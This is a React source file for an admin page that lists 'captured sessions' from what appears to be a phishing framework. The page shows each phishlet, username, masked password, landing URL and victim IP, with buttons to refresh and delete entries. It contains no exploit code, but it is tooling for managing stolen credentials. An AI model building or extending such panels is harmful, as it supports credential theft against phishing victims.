import React, { useState, useEffect } from 'react';
import { sessionAPI } from '../api/client';
import '../styles/sessions.css';

export default function SessionsPage() {
  const [sessions, setSessions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  useEffect(() => {
    fetchSessions();
  }, []);

  const fetchSessions = async () => {
    try {
      setLoading(true);
      const response = await sessionAPI.getAll();
      setSessions(response.data.data || []);
    } catch (err) {
      setError('Failed to load sessions');
    } finally {
      setLoading(false);
    }
  };

  const handleDeleteSession = async (id) => {
    if (!window.confirm('Delete this session?')) return;

    try {
      await sessionAPI.delete(id);
      setSessions(sessions.filter(s => s.id !== id));
    } catch (err) {
      setError('Failed to delete session');
    }
  };

  const handleClearAll = async () => {
    if (!window.confirm('Clear all sessions?')) return;

    try {
      await sessionAPI.deleteAll();
      setSessions([]);
    } catch (err) {
      setError('Failed to clear sessions');
    }
  };

  if (loading) return <div className="loading">Loading sessions...</div>;

  return (
    <div className="sessions-page">
      <h2>Captured Sessions</h2>
      
      {error && <div className="error-message">{error}</div>}
      
      <div className="actions">
        <button onClick={fetchSessions} className="btn-primary">Refresh</button>
        <button onClick={handleClearAll} className="btn-danger" disabled={sessions.length === 0}>
          Clear All
        </button>
      </div>

      <div className="sessions-count">Total: {sessions.length} sessions</div>

      <table className="sessions-table">
        <thead>
          <tr>
            <th>ID</th>
            <th>Phishlet</th>
            <th>Username</th>
            <th>Password</th>
            <th>URL</th>
            <th>IP Address</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          {sessions.map(session => (
            <tr key={session.id}>
              <td>{session.id}</td>
              <td>{session.phishlet}</td>
              <td>{session.username || '-'}</td>
              <td>{'*'.repeat((session.password || '').length) || '-'}</td>
              <td className="url-cell">{session.landing_url}</td>
              <td>{session.remote_addr}</td>
              <td>
                <button 
                  onClick={() => handleDeleteSession(session.id)}
                  className="btn-small btn-danger"
                >
                  Delete
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>

      {sessions.length === 0 && (
        <div className="empty-state">No sessions captured yet</div>
      )}
    </div>
  );
}
